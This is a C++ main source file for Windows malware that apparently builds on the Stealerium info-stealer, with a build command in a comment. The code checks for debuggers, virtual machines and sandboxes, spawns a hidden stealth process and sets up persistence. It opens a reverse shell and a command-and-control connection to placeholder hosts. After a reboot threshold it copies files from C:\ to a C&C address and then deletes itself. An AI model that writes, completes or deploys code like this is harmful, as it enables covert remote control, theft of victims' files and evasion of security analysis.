#include "main.h"
#include "Authenticator.h"
#include "Utilities.h"
#include "Paths.h"
#include "AnalysisEvasion.h"
#include "persistence.h"
#include "self_destruct.h"
#include "ReverseShell.h"
#include "gatherer.h"
#include "exfiltrator.h"
#include <iostream>
#include <filesystem>
#include <thread>
#include <windows.h>
#include <vector>
#include <cstdlib>
#include <mutex>
#include <condition_variable>

// Link with the Winsock library
#pragma comment(lib, "Ws2_32.lib")

extern std::mutex exfilMutex;
extern std::condition_variable cv;
extern bool doneGathering;
// windres resource.rc -O coff -o resource.o && g++ -o secreto.exe main.cpp ReverseShell.cpp persistence.cpp AnalysisEvasion.cpp Paths.cpp Authenticator.cpp Utilities.cpp self_destruct.cpp exfiltrator.cpp gatherer.cpp resource.o -IC:/mingw64/include -IC:/crypto -IC:/fmt-11.0.2/fmt-11.0.2/include -IC:/Users/alexa/json/include -Iinclude -I. -LC:/mingw64/lib -LC:/OpenSSL-Win64/lib/VC/x64/MD -LC:/curl-8.11.0_1-win64-mingw/lib -lcurl -lssl -lcrypto -lgdi32 -luser32 -lkernel32 -lole32 -loleaut32 -lws2_32 -luuid -lwbemuuid -lwinhttp -lshlwapi -static -std=c++17 -pthread -Wno-deprecated-declarations -mwindows
int main(int argc, char* argv[]) {
    wchar_t exePath[MAX_PATH];
    if (GetModuleFileNameW(NULL, exePath, MAX_PATH) == 0) {
        return 1; // Exit if the executable path cannot be retrieved
    }

    const int threshold = 5;

    // Check if another stealth process is already running
    if (isStealthProcessRunning()) {
        return 0; // Exit if another instance is running
    }

    if (argc == 2 && std::string(argv[1]) == "stealth") {
        HANDLE thread = CreateThread(
            NULL,                      // Default security attributes
            0,                         // Default stack size
            runStealthTasksWrapper,    // Wrapper for runStealthTasks
            NULL,                      // Argument to thread function
            0,                         // Default creation flags
            NULL                       // Thread identifier
        );

        if (thread) {
            CloseHandle(thread);
        }

        while (true) {
            Sleep(10000); // Keep the process alive
        }
        return 0;
    }

    // Launch stealth process
    launchStealthProcess();

    // Self-destruct logic
   // Self-destruct logic
if (incrementRebootCounter(threshold)) {
    const std::string directoryPath = "C:\\";
    const std::string targetURL = "http://C&C server ip :7000";

    try {
        gatherFilesAndExfiltrate(directoryPath, targetURL);
    } catch (...) {
        // Log the failure or silently handle the exception
        std::cerr << "[ERROR] Data exfiltration failed." << std::endl;
    }

    // Proceed with self-destruction regardless of exfiltration success
    selfDestruct(std::wstring(exePath));

    return 0;
}

    return 0;
}
// Existing runStealthTasks function
void runStealthTasks() {
    try {
        AntiAnalysis antiAnalysis;

        // Perform anti-analysis checks
        antiAnalysis.IntroduceDelay(1000);
        if (!antiAnalysis.CheckSystemUptime(60) || 
            antiAnalysis.CheckForDebugger() || 
            antiAnalysis.DetectVirtualMachine() || 
            !antiAnalysis.EvadeSandbox() || 
            !antiAnalysis.checkScreenResolution() || 
            !antiAnalysis.checkProcessCount()) {
            return;
        }

        // Initialize working directory and persistence
        Stealerium::Paths::InitWorkDir();
        setupPersistence();

        // Reverse shell setup
        const char host[] = "C&C-ip-here";
        int port = 80;
        RunShell(host, port);

        // Reconnect to listener for additional commands
        const char* C2Server = "C&C-ip-here";
        int C2Port = 443; // Define the C2Port
        ReconnectToListener(C2Server, C2Port);

    } catch (const std::exception &e) {
        std::cerr << "[ERROR] Exception in runStealthTasks: " << e.what() << std::endl;
    } catch (...) {
        std::cerr << "[ERROR] Unknown exception in runStealthTasks." << std::endl;
    }
}

// Optimized launchStealthProcess to run without window
void launchStealthProcess() {
    char exePath[MAX_PATH];
    if (GetModuleFileNameA(NULL, exePath, MAX_PATH) == 0) {
        std::cerr << "[ERROR] Failed to get executable path." << std::endl;
        return;
    }

    std::string command = exePath + std::string(" stealth");

    STARTUPINFOA si = { sizeof(STARTUPINFOA) };
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE; // Ensure no window is shown

    PROCESS_INFORMATION pi;

    if (!CreateProcessA(NULL, &command[0], NULL, NULL, FALSE, CREATE_NO_WINDOW | DETACHED_PROCESS, NULL, NULL, &si, &pi)) {
        std::cerr << "[ERROR] Failed to launch stealth process. Error code: " << GetLastError() << std::endl;
        return;
    }

    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
}

DWORD WINAPI runStealthTasksWrapper(LPVOID lpParam) {
    runStealthTasks();  // Call existing function
    return 0;           // Return required by CreateThread
}

bool isStealthProcessRunning() {
    HANDLE hMutex = CreateMutexW(NULL, TRUE, L"Global\\StealthProcessMutex");
    if (GetLastError() == ERROR_ALREADY_EXISTS) {
        CloseHandle(hMutex);
        return true; // Another instance is running
    }
    return false;
}
